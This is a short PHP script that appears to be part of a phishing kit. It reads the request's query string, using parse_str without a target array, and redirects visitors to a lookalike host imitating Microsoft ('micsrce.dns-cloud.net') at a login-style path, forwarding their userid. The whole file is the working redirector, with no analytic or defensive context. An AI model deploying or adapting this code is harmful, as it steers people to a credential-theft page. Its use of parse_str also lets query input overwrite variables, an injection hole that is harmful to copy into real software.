<?php 
	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	parse_str(parse_url($url, PHP_URL_QUERY));
	header('Location: https://micsrce.dns-cloud.net/esccna/=/index.php?l=_AHP5sggsJLP20ZWzbLrtkzcNH0YGCcvRN1gPeG6TEC7cY3jm6H_Product-UserID&userid='.$userid);
?>